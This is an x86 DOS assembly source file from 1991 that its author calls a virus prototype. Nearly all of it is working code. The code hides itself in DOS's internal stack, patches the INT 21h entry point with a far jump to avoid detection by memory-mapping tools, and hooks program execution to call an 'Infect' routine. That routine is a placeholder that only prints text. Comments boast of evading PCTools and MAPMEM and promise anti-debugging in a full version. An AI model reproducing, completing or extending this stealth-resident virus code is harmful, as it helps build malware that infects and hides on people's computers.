;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;±									      ±
;±			V I R U S   P R O T O T Y P E			      ±
;±									      ±
;±   Author	: Waleri Todorov, CICTT, (C)-Copyright 1991, All Rights Rsrvd ±
;±   Date	: 25 Jan 1991	 21:05					      ±
;±   Function	: Found DOS stack in put himself in it. Then trace DOS	      ±
;±		  function EXEC and type 'Infect File'                        ±
;±									      ±
;±									      ±
;±	 If you want to have fun with this program just run file STACK.COM    ±
;±  Don't worry, this is not a virus yet, just try to find him in memory      ±
;±  with PCTools and/or MAPMEM. If you can -> just erase the source - it is   ±
;±  useless for you. If you can't -> you don't have to look at it - it is too ±
;±  difficult to you to understand it.					      ±
;±					     Best regards, Waleri Todorov     ±
;±									      ±
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±




		mov	ah,52h		; Get DOS segmenty
		int	21h

		cmp	ax,1234h	; Also check for already here
		jne	Install 	; If not -> install in memory
ReturnControl

		int	20h		; This program will give control
					; to main file
Install
		mov	ax,es		; mov DOS segment in AX
		mov	DosSeg,ax	; Save DOS segment for further usage
		mov	ds,ax		; DS now point in DOS segment

		call	SearchDos	; Search DOS entry point
		call	SearchStack	; Search DOS stack

		push	cs		; DS=ES=CS
		push	cs
		pop	ds
		pop	es

		mov	ax,DosSeg	; get DOS segment in AX
		mov	cl,4		; AX*=16
		shl	ax,cl
		mov	bx,StackOff	; Stack new begin in BX
		and	bx,0FFF0h	; Mask low 4 bit
		add	ax,bx		; Compute new real address
		mov	cl,4		; AX/=16
		shr	ax,cl		; Now we get SEGMENT:0000
		sub	ax,10h		; Segment-=10-> SEG:100h
		mov	StackOff,ax	; Save new segment for further usage
		mov	es,ax		; ES point in DOS New area
		mov	si,100h 	; ES:DI -> DOS:free_space_in_stack
		mov	di,si		; DS:SI Current segment
		mov	cx,512d 	; Virus is only 512 bytes long
		rep	movsb		; Move virus to new place

; Installing virus in DOS' stack we will avoid a conflict with PCTools,
; MAPMEM, and other sys software. Remark, that no one DOS buffer wasn't
; affected, so if you have program, that count DOS' buffers to found
; Beast666, she won't found anything.
; In further release of full virus I will include anti-debugger system,
; so you will not be able to trace virus

		mov	di,DosOff	; ES:DI point to DOS int21 entry point
		mov	ax,DosSeg
		mov	es,ax
		mov	al,0EAh 	; JMP	XXXX:YYYY
		stosb
		mov	ax,offset Entry21
		stosw			; New 21 handler's offset
		mov	ax,StackOff
		stosw			; New 21 handler's segment


; Now DOS will make far jump to virus. In case that virus won't
; get vector 21 directly, MAPMEM-like utilities won't show int 21 catching,
; and DOSEDIT will operate correctly (with several virus he don't).

		inc	di
		inc	di
		mov	Int21off,di	; Virus will call DOS after jump
		jmp	ReturnControl	; Return control to file

; At this moment, return control is just terminate program via int 20h.
; In further release of full virus this subroutine will be able to
; return control to any file (COM or EXE).



; These are two scanners subroutine. All they do are scanning DOS segment
; for several well-known bytes. Then they update some iternal variables.
; Be patience, when debug this area!

SearchDos
		mov	ax,cs:[DosSeg]
		mov	ds,ax
		xor	si,si

Search1
		lodsw
		cmp	ax,3A2Eh
		je	NextDos1
		dec	si
		jmp	short Search1
NextDos1
		lodsb
		cmp	al,26h
		je	LastDos
		sub	si,2
		jmp	short Search1
LastDos
		inc	si
		inc	si
		lodsb
		cmp	al,77h
		je	FoundDos
		sub	si,5
		jmp	short Search1
FoundDos
		inc	si
		mov	cs:[Int21off],si
		sub	si,7
		mov	cs:[DosOff],si
		ret

SearchStack
		xor	si,si
Search2
		lodsw
		cmp	ax,0CB8Ch
		je	NextStack1
		dec	si
		jmp	short Search2
NextStack1
		lodsw
		cmp	ax,0D38Eh
		je	NextStack2
		sub	si,3
		jmp	short Search2
NextStack2
		lodsb
		cmp	al,0BCh
		je	FoundStack
		sub	si,4
		jmp	short Search2
FoundStack
		mov	di,si
		lodsw
		sub	ax,200h
		stosw
		mov	cs:[StackOff],ax
		ret

Entry21 				; Here is new int 21 handler
		cmp	ah,52h		; If GET_LIST_OF_LISTS
		jne	NextCheck

		mov	ax,1234h	; then probably I am here
		mov	bx,cs:[DosSeg]	; so return special bytes in AX
		mov	es,bx
		mov	bx,26h
		iret			; Terminate AH=52h->return to caller
NextCheck
		cmp	ax,4B00h	; If EXEC file
		jne	GoDos
		call	Infect		; then file will be infected
GoDos
		jmp	dword ptr cs:[Int21off]
					; Otherwise jump to DOS
Infect
		push	ds		; At this moment just write on screen
		push	dx
		push	ax

		push	cs
		pop	ds
		mov	dx,offset Txt
		mov	ah,9
CallDos
		pushf			; Call real DOS
		call	dword ptr cs:[Int21off]

		pop	ax
		pop	dx
		pop	ds
		ret

Int21off	dw	0	; Offset of DOS 21 AFTER jump to virus
DosSeg		dw	0	; DOS segment
StackOff	dw	0	; Offset of stack/New segment
DosOff		dw	0	; Offset of DOS 21 BEFIRE jump
Txt		db	'Infect File$'  ; Dummy text

